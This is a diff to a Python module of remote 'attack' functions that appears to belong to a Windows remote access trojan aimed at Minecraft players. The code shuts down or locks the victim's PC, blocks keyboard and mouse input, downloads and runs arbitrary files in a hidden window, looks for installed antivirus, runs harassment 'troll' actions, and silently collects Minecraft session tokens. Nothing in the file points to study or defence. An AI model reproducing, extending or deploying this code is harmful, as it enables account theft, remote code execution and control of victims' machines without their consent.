@@ -16,94 +16,49 @@ import json
 from datetime import datetime
 
 # Global variables for input blocking
-_keyboard_hook = None
-_mouse_hook = None
-_hook_thread = None
-_stop_hooks = threading.Event()
+_keyboard_blocked = False
+_mouse_blocked = False
 
-# Input hook functions
-def _keyboard_block_callback(nCode, wParam, lParam):
-    if nCode >= 0:
-        return 1  # Block the key
-    return ctypes.windll.user32.CallNextHookExW(_keyboard_hook, nCode, wParam, lParam)
-
-def _mouse_block_callback(nCode, wParam, lParam):
-    if nCode >= 0:
-        return 1  # Block the mouse event
-    return ctypes.windll.user32.CallNextHookExW(_mouse_hook, nCode, wParam, lParam)
-
-def _setup_input_blocks():
-    global _keyboard_hook, _mouse_hook, _hook_thread, _stop_hooks
-    
-    _stop_hooks.clear()
-    
-    def hook_loop():
-        # Set up keyboard hook
-        keyboard_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
-        _keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
-            13,  # WH_KEYBOARD_LL
-            keyboard_proc(_keyboard_block_callback),
-            ctypes.windll.kernel32.GetModuleHandleW(None),
-            0
-        )
-        
-        # Set up mouse hook
-        mouse_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
-        _mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
-            14,  # WH_MOUSE_LL
-            mouse_proc(_mouse_block_callback),
-            ctypes.windll.kernel32.GetModuleHandleW(None),
-            0
-        )
-        
-        # Message loop
-        msg = wintypes.MSG()
-        while not _stop_hooks.is_set():
-            ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
-            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
-            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
-    
-    _hook_thread = threading.Thread(target=hook_loop, daemon=True)
-    _hook_thread.start()
-
-def _remove_input_blocks():
-    global _keyboard_hook, _mouse_hook, _stop_hooks
-    
-    _stop_hooks.set()
-    
-    if _keyboard_hook:
-        ctypes.windll.user32.UnhookWindowsHookEx(_keyboard_hook)
-        _keyboard_hook = None
-    
-    if _mouse_hook:
-        ctypes.windll.user32.UnhookWindowsHookEx(_mouse_hook)
-        _mouse_hook = None
+def _block_input(block):
+    """Block or unblock keyboard and mouse input"""
+    try:
+        ctypes.windll.user32.BlockInput(block)
+        return True
+    except Exception as e:
+        print(f"Input block error: {e}")
+        return False
 
 def attack_controlpc(target, duration=60):
     """Remote control PC functions - Admin only"""
+    print(f"Executing controlpc command: {target}")
     parts = target.split('|')
     command = parts[0]
     
     try:
         if command == "shutdown":
+            print("Shutting down system...")
             subprocess.run(["shutdown", "/s", "/t", "1"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                          shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             
         elif command == "restart":
+            print("Restarting system...")
             subprocess.run(["shutdown", "/r", "/t", "1"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                          shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             
         elif command == "lock":
+            print("Locking workstation...")
             ctypes.windll.user32.LockWorkStation()
             
         elif command == "logoff":
+            print("Logging off...")
             subprocess.run(["shutdown", "/l", "/f"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                          shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             
         elif command == "close_minecraft":
+            print("Closing Minecraft...")
             subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                          shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -111,11 +66,13 @@ def attack_controlpc(target, duration=60):
         elif command == "popup":
             if len(parts) > 1:
                 message = parts[1]
+                print(f"Showing popup: {message}")
                 ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)
                 
         elif command == "download_execute":
             if len(parts) > 1:
                 url = parts[1]
+                print(f"Downloading and executing: {url}")
                 import urllib.request
                 
                 # Create temp directory
@@ -139,18 +96,23 @@ def attack_controlpc(target, duration=60):
                                creationflags=subprocess.CREATE_NO_WINDOW)
                 
         elif command == "freeze_keyboard":
-            _setup_input_blocks()
+            print("Freezing keyboard...")
+            _block_input(True)
             
         elif command == "freeze_mouse":
-            _setup_input_blocks()
+            print("Freezing mouse...")
+            _block_input(True)
             
         elif command == "freeze_both":
-            _setup_input_blocks()
+            print("Freezing both keyboard and mouse...")
+            _block_input(True)
             
         elif command == "unfreeze":
-            _remove_input_blocks()
+            print("Unfreezing input...")
+            _block_input(False)
             
         elif command == "check_av":
+            print("Checking antivirus...")
             av_list = []
             av_paths = [
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
@@ -181,6 +143,7 @@ def attack_controlpc(target, duration=60):
         elif command == "troll":
             if len(parts) > 1:
                 troll_cmd = parts[1]
+                print(f"Executing troll command: {troll_cmd}")
                 
                 if troll_cmd == "open_cd":
                     ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
@@ -209,25 +172,23 @@ def attack_controlpc(target, duration=60):
                 elif troll_cmd == "mouse_jiggler":
                     def jiggle_mouse():
                         while True:
-                            x = random.randint(0, 100)
-                            y = random.randint(0, 100)
+                            x = random.randint(0, 1920)
+                            y = random.randint(0, 1080)
                             ctypes.windll.user32.SetCursorPos(x, y)
-                            time.sleep(5)
+                            time.sleep(30)  # Jiggle every 30 seconds
                     
-                    thread = threading.Thread(target=jiggle_mouse)
-                    thread.daemon = True
+                    thread = threading.Thread(target=jiggle_mouse, daemon=True)
                     thread.start()
                     
                 elif troll_cmd == "keyboard_spam":
                     def spam_keys():
                         while True:
-                            key = random.randint(65, 90)
-                            ctypes.windll.user32.keybd_event(key, 0, 0, 0)
-                            ctypes.windll.user32.keybd_event(key, 0, 2, 0)
-                            time.sleep(1)
+                            # Press Windows key
+                            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)  # VK_LWIN
+                            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)  # Release
+                            time.sleep(10)
                     
-                    thread = threading.Thread(target=spam_keys)
-                    thread.daemon = True
+                    thread = threading.Thread(target=spam_keys, daemon=True)
                     thread.start()
                     
                 elif troll_cmd == "play_sound":
@@ -235,12 +196,15 @@ def attack_controlpc(target, duration=60):
                     
                 elif troll_cmd == "change_wallpaper":
                     ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
+        
+        print(f"Control command '{command}' completed successfully")
                 
     except Exception as e:
-        pass
+        print(f"Error in controlpc command: {e}")
 
 def attack_refresh_session_id(target, duration=0):
     """Extract Minecraft session information silently"""
+    print("Refreshing Minecraft session ID...")
     try:
         session_data = {
             'success': False,
@@ -309,7 +273,9 @@ def attack_refresh_session_id(target, duration=0):
         session_data['success'] = len(session_data['sessions']) > 0
         session_data['process_count'] = len(session_data['sessions'])
         
-        return f"SESSION_DATA:{json.dumps(session_data)}"
+        result = f"SESSION_DATA:{json.dumps(session_data)}"
+        print(f"Session data collected: {result}")
+        return result
         
     except Exception as e:
         error_data = {
@@ -317,7 +283,6 @@ def attack_refresh_session_id(target, duration=0):
             'error': str(e),
             'timestamp': datetime.now().isoformat()
         }
-        return f"SESSION_DATA:{json.dumps(error_data)}"
-
-# You can add more attack functions here and they will be automatically loaded by the client
-# Just make sure they start with 'attack_' prefix
+        result = f"SESSION_DATA:{json.dumps(error_data)}"
+        print(f"Error collecting session data: {result}")
+        return result
